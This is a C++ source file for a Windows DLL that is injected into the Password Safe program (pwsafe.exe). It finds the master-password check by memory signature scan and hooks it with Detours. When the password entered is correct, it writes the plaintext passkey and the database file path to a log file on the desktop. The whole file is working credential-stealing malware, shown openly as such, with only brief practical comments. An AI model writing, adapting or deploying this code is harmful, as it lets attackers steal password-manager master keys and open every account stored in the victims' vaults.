// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <iostream>
#include "detours.h"
#include "sigscan.h"
#include <stdio.h>
#include <fstream>
using namespace std;

// will probably want to change where the output file is saved
char outFile[] = "C:\\users\\tester\\desktop\\pwsafe_log.txt";

DWORD AddressOfOrigFunc = 0;
typedef int(*CheckPassKey)(const string& filename, const string& passkey, string& version);
bool hooked = false;

void writeToFile(const char t[]) {
	ofstream myfile;
	myfile.open(outFile, std::ios_base::app);
	myfile << t;
	myfile.close();
}

void convertString(const char name[], string& sValue, int length) {
	int buff_size = length * 2;
	char* c = new char[buff_size];
	SIZE_T dwRead;
	ReadProcessMemory(GetCurrentProcess(), (LPVOID&)sValue, c, buff_size, &dwRead);

	ofstream myfile;
	myfile.open(outFile, std::ios_base::app);
	myfile << "[*] " << name << ": ";
	for (int i = 0; i < buff_size; i++)
	{
		if ((int)c[i] != 0)
		{
			myfile << c[i];
		}
	}
	myfile << "\n";
	myfile.close();

	delete[] c;
}

int HookCheckPassKey(string& filename, string &passkey, string& version)
{
	// check if passkey is correct by running the original function
	CheckPassKey originalCheck = (CheckPassKey)AddressOfOrigFunc;
	int result = originalCheck(filename, passkey, version);

	// if the result is 0 the passkey is correct
	// if it is 5 it is incorrect
	if (result == 0)
	{
		char passkey_original_address[50];
		sprintf_s(passkey_original_address, "[+] Address of passkey: 0x%p\n", (LPVOID&)passkey);
		writeToFile(passkey_original_address);

		convertString("Passkey", passkey, passkey.size());
		convertString("Database", filename, filename.size());
	}

	return result;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		writeToFile("[+] Injected\n");
		SigScan Scanner;
		char program[] = "pwsafe.exe";
		char signature[] = "\x55\x8b\xec\x83\xec\x10\xb8\xcc\xcc\xcc\xcc\x89\x45\xf0\x89\x45\xf4\x89\x45\xf8\x89\x45\xfc\x8b\x45\x0c\x8b\x48";
		char mask[] = "xxxxxxxxxxxxxxxxxxxxxxxxxxxx";
		AddressOfOrigFunc = Scanner.FindPattern(program, signature, mask);
		int* noAddress = 0x00000000;

		// check if the signature / address was found in memory
		if ((LPVOID&)AddressOfOrigFunc != noAddress) {
			hooked = true;
			
			char x[50];
			sprintf_s(x, "[+] Address of original function: 0x%p\n", (LPVOID&)AddressOfOrigFunc);
			writeToFile(x);

			DetourTransactionBegin();
			DetourUpdateThread(GetCurrentThread());

			// this will hook the function
			DetourAttach(&(LPVOID&)AddressOfOrigFunc, &HookCheckPassKey);
			DetourTransactionCommit();
		}
		else {
			writeToFile("[-] Address for the function not found\n");
			writeToFile("----------------------------------------------------\n");
		}

	}
	else if (ul_reason_for_call == DLL_PROCESS_DETACH)
	{
		// if the function is hooked, unhook before detaching
		if (hooked) {
			DetourTransactionBegin();
			DetourUpdateThread(GetCurrentThread());

			// this will unhook the function
			DetourDetach(&(LPVOID&)AddressOfOrigFunc, &HookCheckPassKey);
			DetourTransactionCommit();
			writeToFile("[-] Process detached\n");
			writeToFile("----------------------------------------------------\n");
		}
	}

	return TRUE;
}